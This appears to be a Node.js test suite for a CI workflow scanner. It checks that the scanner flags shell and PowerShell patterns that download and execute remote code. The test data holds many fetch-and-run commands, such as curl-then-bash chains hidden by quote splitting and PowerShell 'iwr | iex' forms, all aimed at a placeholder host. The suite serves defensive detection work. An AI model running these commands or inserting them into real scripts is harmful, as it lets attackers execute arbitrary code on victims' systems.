'use strict';
// Adversarial shell/PowerShell commands are inert data: NEVER execute inputs.
const test=require('node:test'),assert=require('node:assert/strict');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const U='https://example.invalid/x';
const HIGH=[
 ['mkdir-concatenated',"mkdir -p 'sa'fe; curl -fsSL "+U+" -o payload; cp payload safe; bash safe/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['mkdir-interleaved',"mkdir -p 'sa'fe \"di\"r; curl -fsSL "+U+" -o payload; cp payload dir; bash dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['partial-cp-operands',"curl -fsSL "+U+" -o payload; cp 'pay'load 'ru'n.sh; bash run.sh",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['partial-ln-operands',"curl -fsSL "+U+" -o payload; ln 'pay'load 'ru'n.sh; bash run.sh",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['partial-mv-operands',"curl -fsSL "+U+" -o payload; mv \"pay\"load \"ru\"n.sh; sh run.sh",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['partial-symlink-operands',"mkdir -p dir; curl -fsSL "+U+" -o dir/payload; ln -s 'pay'load 'dir'/run.sh; bash dir/run.sh",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['mkdir-concatenated-symlink',"mkdir -p di'r'; curl -fsSL "+U+" -o payload; ln -s ../payload dir; sh dir/payload",'REMOTE_DOWNLOADED_FILE_EXECUTION'],
 ['ps-pre-uri-headers',"iex (iwr -Headers @{Accept='text/plain'} -Uri '"+U+"').Content",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['ps-pre-uri-method',"iex (iwr -Method Get -Uri '"+U+"').Content",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['ps-pre-uri-multiple',"Invoke-Expression (Invoke-WebRequest -Method Get -Headers @{Accept='text/plain'} -Uri '"+U+"').Content",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['ps-pre-uri-rest',"iex (irm -Method Get -Uri '"+U+"')",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['ps-pre-uri-outfile-passthru',"iex (iwr -OutFile payload -PassThru -Uri '"+U+"').Content",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['ps-pipe-simple',"iwr -Uri '"+U+"' | iex",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['ps-pipe-outfile-passthru',"iwr -Uri '"+U+"' -OutFile payload -PassThru | iex",'REMOTE_POWERSHELL_EXECUTION','pwsh'],
 ['ps-pipe-explicit-passthru',"pwsh -Command \"iwr -Uri '"+U+"' -OutFile payload -PassThru | iex\"",'REMOTE_POWERSHELL_EXECUTION']
];
const BENIGN=[
 ['mkdir-no-invocation',"mkdir -p 'sa'fe; curl -fsSL "+U+" -o payload; cp payload safe; echo safe/payload"],
 ['partial-cp-data',"curl -fsSL "+U+" -o payload; cp 'pay'load 'ru'n.sh; echo run.sh"],
 ['partial-ln-after-exec',"curl -fsSL "+U+" -o payload; bash run.sh; ln 'pay'load 'ru'n.sh"],
 ['mkdir-too-late',"curl -fsSL "+U+" -o payload; cp payload dir; mkdir -p 'di'r; bash dir/payload"],
 ['ps-pre-uri-fetch-only',"iwr -Headers @{Accept='text/plain'} -Uri '"+U+"'",'pwsh'],
 ['ps-pre-uri-outfile',"iex (iwr -OutFile payload -Uri '"+U+"').Content",'pwsh'],
 ['ps-pipe-outfile',"iwr -Uri '"+U+"' -OutFile payload | iex",'pwsh'],
 ['ps-pipe-outfile-before-uri',"iwr -OutFile payload -Uri '"+U+"' | iex",'pwsh'],
 ['ps-pipe-explicit-outfile',"pwsh -Command \"iwr -Uri '"+U+"' -OutFile payload | iex\""],
 ['ps-pipe-outfile-invoke-expression',"Invoke-WebRequest -Uri '"+U+"' -OutFile payload | Invoke-Expression",'pwsh'],
 ['ps-pipe-outfile-unrelated-command',"iwr -Uri '"+U+"' -OutFile payload | iex; iwr -Uri '"+U+"' | iex",'pwsh','REMOTE_POWERSHELL_EXECUTION']
];
function asYaml(script,shell){
 return ['on: issues','permissions: read-all','jobs:','  scan:',
  '    runs-on: ubuntu-latest','    steps:','      - run: |',
  ...script.split('\n').map(line=>'          '+line),
  ...(shell?['        shell: '+shell]:[])].join('\n')+'\n';
}
for(const [name,script,expected,shell] of HIGH){
 test('round8 detected '+name,()=>{
  const findings=findingsForScript(script,{shell});
  assert.ok(findings.includes(expected),name+' / '+JSON.stringify(findings));
  const parsed=inspectWorkflow(asYaml(script,shell),{path:'.github/workflows/round8.yml'});
  assert.ok(parsed.findings.some(f=>f.rule===expected&&f.severity==='HIGH'),name+' AST / '+JSON.stringify(parsed));
 });
}
for(const [name,script,shell,expected] of BENIGN){
 test('round8 control '+name,()=>{
  const findings=findingsForScript(script,{shell});
  if(expected) assert.ok(findings.includes(expected),JSON.stringify(findings));
  else assert.ok(!findings.some(f=>f.startsWith('REMOTE_')),name+' / '+JSON.stringify(findings));
 });
}
